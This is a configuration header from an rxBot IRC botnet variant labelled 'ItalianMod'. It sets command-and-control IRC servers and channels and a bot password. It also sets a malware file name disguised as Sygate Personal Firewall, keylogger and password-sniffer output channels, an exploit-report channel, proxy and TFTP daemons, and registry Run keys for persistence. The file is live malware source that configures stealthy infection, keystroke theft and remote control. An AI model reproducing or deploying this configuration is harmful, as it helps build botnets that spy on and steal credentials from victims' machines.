// Good shit Mod By DoS Resilient RPMiSO !
// bot configuration (generic) - doesn't need to be encrypted
int port = 6667;				// server port
int port2 = 7000;				// backup server port
int socks4port = 1980;			// Port # for sock4 daemon to run on  - CHANGE THIS!!!
int tftpport = 69;				// Port # for tftp daemon to run on
int httpport = 84;			// Port # for http daemon to run on
int rloginport = 5004;			// Port # for rlogin daemon to run on
BOOL topiccmd = TRUE;			// set to TRUE to enable topic commands
BOOL rndfilename = FALSE;		// use random file name
BOOL AutoStart = TRUE;			// enable autostart registry keys
char prefix = '-';				// command prefix (one character max.)
int maxrand = 6;				// how many random numbers in the nick
int nicktype = COUNTRYNICK;		// nick type (see rndnick.h)
BOOL nickprefix = TRUE;			// nick uptime & mirc prefix

#ifdef DEBUG_LOGGING
char logfile[]="c:\\r0fl.txt";
#endif

#ifndef NO_CRYPT // Only use encrypted strings or your binary will not be secure!!

#else  // Recommended to use this only for Crypt() setup, this is unsecure.

char botid[] = "BoT";						// bot id
char version[] = "[rxBot ItalianMod by DoS|ResilienT|RPMISO";		// NON MODIFIKARE DIO BO ! :S
char password[] = "Tuapass";					// bot password
char server[] = "irc.flashirc.org";		// server
char serverpass[] = "";						// server password
char channel[] = "#Tuocanale";				// channel that the bot should join
char chanpass[] = "tuakey";						// channel password
char server2[] = "irc2.flashirc.org";						// backup server (optional)
char channel2[] = "#tuocanale";						// backup channel (optional)
char chanpass2[] = "tuakey";						// backup channel password (optional)
char filename[] = "Sygate.exe";			// destination file name
char keylogfile[] = "Allarm.txt";				// keylog filename
char valuename[] = "Sygate Personal Firewall";		// value name for autostart
char nickconst[] = "";					// first part to the bot's nick
char szLocalPayloadFile[]="msconfig.dat";	// Payload filename
char modeonconn[] = "+n+B";					// Can be more than one mode and contain both + and -
char exploitchan[] = "#tuocanale";					// Channel where exploit messages get redirected
char keylogchan[] = "#tuocanale";						// Channel where keylog messages get redirected
char psniffchan[] = "#tuocanale";						// Channel where psniff messages get redirected 

char *authost[] = {
	"*@*",
};

char *versionlist[] = {
	""
};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

#endif

#ifdef PLAIN_CRYPT
char key[16] = "i0r0xx0"; // CHANGE THIS!!! hmmm..Do I even need this now?
#endif
